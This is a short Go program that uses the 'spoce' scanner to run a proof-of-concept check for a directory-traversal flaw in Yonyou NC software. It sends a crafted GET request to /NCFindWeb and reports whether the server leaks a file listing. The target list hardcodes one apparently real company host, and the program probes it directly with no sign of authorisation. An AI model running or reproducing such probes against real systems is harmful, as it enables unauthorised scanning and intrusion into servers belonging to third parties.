package main

import (
	"log"

	"github.com/yanmengfei/spoce/build"
	"github.com/yanmengfei/spoce/library/http"
	"github.com/yanmengfei/spoce/scanner"
)

var urls = []string{
	"http://ehr.feihe.com",
}

// []byte
var pocYamlStr = `name: poc-yaml-yonyou-nc-directory-traversal
set:
  s1: b'jsp'
  s2: 200
rules:
  - method: GET
    path: /NCFindWeb?service=IPreAlertConfigService&filename=
    headers:
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
    expression: |
      response.status == int(s2) && response.body.bcontains(bytes('jsp'))
`

func logic(poc *build.PocEvent, target string) error {
	scan, err := scanner.New(poc)
	if err == nil {
		var verify bool
		if poc.Rules != nil {
			verify, err = scan.Start(target, poc.Rules)
		} else {
			verify, err = scan.StartByGroups(target, poc.Groups)
		}
		scanner.Release(scan)
		log.Printf("%s: %v", target, verify)
	}
	return err
}

func main() {
	http.Setup(20, 5)
	poc, err := build.NewPocEventWithYamlStr(pocYamlStr)
	if err != nil {
		log.Panic(err)
	}
	for i := 0; i < len(urls); i++ {
		logic(poc, urls[i])
	}
}
